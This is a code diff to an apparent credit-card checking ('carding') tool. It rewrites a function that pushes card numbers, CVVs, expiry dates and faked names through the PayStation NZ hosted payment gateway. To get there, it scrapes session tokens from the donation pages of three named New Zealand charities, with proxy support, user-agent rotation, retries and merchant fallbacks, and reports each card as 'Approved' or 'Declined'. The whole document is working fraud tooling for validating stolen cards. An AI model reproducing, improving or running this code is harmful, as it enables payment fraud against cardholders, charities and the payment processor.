@@ -901,98 +901,202 @@ def check_cc_charge(cc_number, month, year, cvv, proxies=None):
         return f"Error: {str(e)}"
 
 
+STC_MERCHANTS = [
+    {
+        'name': 'Cancer Society NZ',
+        'donate_url': 'https://www.cancer.org.nz/donate/',
+        'payment_url': 'https://www.cancer.org.nz/paymentendpoint/',
+    },
+    {
+        'name': 'Rescue Helicopter NZ',
+        'donate_url': 'https://www.rescue.org.nz/donate/',
+        'payment_url': 'https://www.rescue.org.nz/donate/',
+    },
+    {
+        'name': 'Starship NZ',
+        'donate_url': 'https://www.starship.org.nz/donate/',
+        'payment_url': 'https://www.starship.org.nz/donate/',
+    },
+]
+
+
 def check_cc_stc(cc_number, month, year, cvv, proxies=None):
-    """STC gate — PayStation NZ payment gateway auth with retry."""
+    """STC gate — PayStation NZ with multiple merchant fallbacks + exponential backoff."""
     start_time = time.time()
-    session = requests.Session()
     ua = _rand_ua()
 
-    try:
-        # Step 1: Get hosted session
-        merchant_url = 'https://www.cancer.org.nz/paymentendpoint/'
+    exp_mm = month.zfill(2)
+    exp_yy = year[-2:] if len(year) == 4 else year.zfill(2)
+    card_expiry = f"{exp_mm}{exp_yy}"
 
-        def do_get():
-            return session.get(merchant_url, headers={'User-Agent': ua}, proxies=proxies, timeout=15, allow_redirects=True)
+    if faker:
+        card_name = faker.name()
+    else:
+        card_name = "John Smith"
 
+    last_error = "All STC merchants failed"
+
+    for merchant in STC_MERCHANTS:
+        session = requests.Session()
         try:
-            resp1 = _retry_request(do_get, max_retries=2, backoff=3)
-        except Exception:
-            return f"⚠️ STC Merchant Down | cancer.org.nz unreachable ({round(time.time() - start_time, 2)}s)"
+            # Step 1: Get the donation/payment page to find PayStation hosted URL
+            for attempt in range(3):
+                try:
+                    resp1 = session.get(merchant['payment_url'], headers={
+                        'User-Agent': ua,
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                    }, proxies=proxies, timeout=12, allow_redirects=True)
+                    if resp1.status_code == 200:
+                        break
+                    elif resp1.status_code >= 500:
+                        if attempt < 2:
+                            time.sleep(2 * (attempt + 1))
+                            continue
+                        last_error = f"{merchant['name']} HTTP {resp1.status_code}"
+                        break
+                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                    if attempt < 2:
+                        time.sleep(2 * (attempt + 1))
+                        continue
+                    last_error = f"{merchant['name']} unreachable"
+                    break
+            else:
+                continue
 
-        # Extract PayStation hosted page URL
-        ps_match = re.search(r'https://payments\.paystation\.co\.nz/hosted/?\?[^"\'>\s]+', resp1.text)
-        if not ps_match:
-            ps_match = re.search(r'action=["\']?(https://payments\.paystation\.co\.nz[^"\'>\s]*)', resp1.text)
+            if resp1.status_code != 200:
+                continue
 
-        if ps_match:
-            hosted_url = ps_match.group(0).rstrip('"\'>')
-            resp2 = session.get(hosted_url, headers={'User-Agent': ua}, proxies=proxies, timeout=15)
-        else:
-            resp2 = resp1
+            # Also try the donate page if payment page didn't have PayStation
+            pages_to_check = [resp1]
+            if merchant['donate_url'] != merchant['payment_url']:
+                try:
+                    resp_donate = session.get(merchant['donate_url'], headers={'User-Agent': ua}, proxies=proxies, timeout=10, allow_redirects=True)
+                    if resp_donate.status_code == 200:
+                        pages_to_check.append(resp_donate)
+                except Exception:
+                    pass
 
-        # Extract hidden fields
-        hk_match = re.search(r'name=["\']?hk["\']?\s+value=["\']?([^"\'>\s]+)', resp2.text)
-        hk = hk_match.group(1) if hk_match else ''
+            # Step 2: Find PayStation hosted URL from any page
+            hosted_url = None
+            for page_resp in pages_to_check:
+                ps_match = re.search(r'https://payments\.paystation\.co\.nz/hosted/?\?[^"\'>\s]+', page_resp.text)
+                if not ps_match:
+                    ps_match = re.search(r'action=["\']?(https://payments\.paystation\.co\.nz[^"\'>\s]*)', page_resp.text)
+                if not ps_match:
+                    # Look for iframe src
+                    ps_match = re.search(r'src=["\']?(https://payments\.paystation\.co\.nz[^"\'>\s]*)', page_resp.text)
+                if ps_match:
+                    hosted_url = ps_match.group(0).rstrip('"\'> ')
+                    # Clean up if it starts with action= or src=
+                    for prefix in ('action=', 'src='):
+                        if hosted_url.startswith(prefix):
+                            hosted_url = hosted_url[len(prefix):].strip('"\'')
+                    break
 
-        exp_mm = month.zfill(2)
-        exp_yy = year[-2:] if len(year) == 4 else year.zfill(2)
-        card_expiry = f"{exp_mm}{exp_yy}"
+            if not hosted_url:
+                last_error = f"{merchant['name']} no PayStation URL found"
+                continue
 
-        if faker:
-            card_name = faker.name()
-        else:
-            card_name = "John Smith"
+            # Step 3: Load the PayStation hosted page to get hk token
+            resp2 = session.get(hosted_url, headers={
+                'User-Agent': ua,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Referer': merchant['donate_url'],
+            }, proxies=proxies, timeout=15)
 
-        # Step 2: Submit to PayStation
-        ajax_url = 'https://payments.paystation.co.nz/hosted/ajax.php'
-        headers = {
-            'User-Agent': ua,
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Pragma': 'no-cache',
-            'Accept': '*/*',
-        }
-        data = {
-            'card_number': cc_number,
-            'card_security': cvv,
-            'card_expiry': card_expiry,
-            'card_name': card_name,
-            'verified': 'null',
-        }
-        if hk:
-            data['hk'] = hk
+            if resp2.status_code != 200:
+                last_error = f"PayStation page HTTP {resp2.status_code}"
+                continue
 
-        def do_post():
-            return session.post(ajax_url, headers=headers, data=data, proxies=proxies, timeout=20)
+            # Extract hk token — REQUIRED for ajax.php to work
+            hk_match = re.search(r'name=["\']?hk["\']?\s+value=["\']?([^"\'>\s]+)', resp2.text)
+            if not hk_match:
+                hk_match = re.search(r'["\']hk["\']\s*:\s*["\']([^"\']+)', resp2.text)
+            if not hk_match:
+                hk_match = re.search(r'hk=([A-Za-z0-9_\-]+)', resp2.text)
 
-        resp3 = _retry_request(do_post, max_retries=1, backoff=2)
-        process_time = round(time.time() - start_time, 2)
+            if not hk_match:
+                last_error = f"{merchant['name']} no hk token found"
+                continue
 
-        if resp3.status_code == 200:
-            try:
-                rj = resp3.json()
-                successful = rj.get('successful', False)
-                error_code = str(rj.get('error_code', ''))
-                error_msg = rj.get('error_message', '')
+            hk = hk_match.group(1)
 
-                if successful or error_code == '0':
-                    return f"Approved | {error_msg} ({process_time}s)"
-                else:
-                    return f"Declined | [{error_code}] {error_msg} ({process_time}s)"
-            except Exception:
-                text_lower = resp3.text.lower()
-                if 'successful' in text_lower and 'true' in text_lower:
-                    return f"Approved | {resp3.text[:100]} ({process_time}s)"
-                return f"Declined | {resp3.text[:100]} ({process_time}s)"
-        elif resp3.status_code == 429:
-            return f"⚠️ PayStation Rate Limited | Try later ({process_time}s)"
-        elif resp3.status_code >= 500:
-            return f"⚠️ PayStation Down | Server {resp3.status_code} ({process_time}s)"
-        else:
-            return f"Declined | HTTP {resp3.status_code} ({process_time}s)"
-    except requests.exceptions.ConnectionError:
-        return f"⚠️ STC Unreachable | Check proxies ({round(time.time() - start_time, 2)}s)"
-    except Exception as e:
-        return f"Error: {str(e)}"
+            # Step 4: Submit card to PayStation ajax endpoint
+            ajax_url = 'https://payments.paystation.co.nz/hosted/ajax.php'
+            post_data = {
+                'card_number': cc_number,
+                'card_security': cvv,
+                'card_expiry': card_expiry,
+                'card_name': card_name,
+                'verified': 'null',
+                'hk': hk,
+            }
+
+            for attempt in range(3):
+                try:
+                    resp3 = session.post(ajax_url, headers={
+                        'User-Agent': ua,
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Pragma': 'no-cache',
+                        'Accept': '*/*',
+                        'Origin': 'https://payments.paystation.co.nz',
+                        'Referer': hosted_url,
+                    }, data=post_data, proxies=proxies, timeout=20)
+
+                    if resp3.status_code == 200:
+                        break
+                    elif resp3.status_code >= 500:
+                        if attempt < 2:
+                            time.sleep(3 * (attempt + 1))
+                            continue
+                    else:
+                        break
+                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                    if attempt < 2:
+                        time.sleep(3 * (attempt + 1))
+                        continue
+                    resp3 = None
+                    break
+            else:
+                last_error = f"PayStation ajax all retries failed"
+                continue
+
+            if resp3 is None:
+                last_error = f"PayStation timeout after retries"
+                continue
+
+            process_time = round(time.time() - start_time, 2)
+
+            if resp3.status_code == 200:
+                try:
+                    rj = resp3.json()
+                    successful = rj.get('successful', False)
+                    error_code = str(rj.get('error_code', ''))
+                    error_msg = rj.get('error_message', '')
+
+                    if successful or error_code == '0':
+                        return f"Approved | {error_msg} ({process_time}s)"
+                    else:
+                        return f"Declined | [{error_code}] {error_msg} ({process_time}s)"
+                except Exception:
+                    text_lower = resp3.text.lower()
+                    if 'successful' in text_lower and 'true' in text_lower:
+                        return f"Approved | {resp3.text[:100]} ({process_time}s)"
+                    return f"Declined | {resp3.text[:100]} ({process_time}s)"
+            elif resp3.status_code == 429:
+                return f"⚠️ PayStation Rate Limited | Try later ({process_time}s)"
+            elif resp3.status_code >= 500:
+                last_error = f"PayStation Server {resp3.status_code} via {merchant['name']}"
+                continue  # Try next merchant
+            else:
+                return f"Declined | HTTP {resp3.status_code} ({process_time}s)"
+
+        except Exception as e:
+            last_error = f"{merchant['name']}: {str(e)[:50]}"
+            continue
+
+    process_time = round(time.time() - start_time, 2)
+    return f"⚠️ STC All Merchants Failed | {last_error} ({process_time}s)"
 
 
 def check_cc_auth2(cc_number, month, year, cvv, proxies=None):
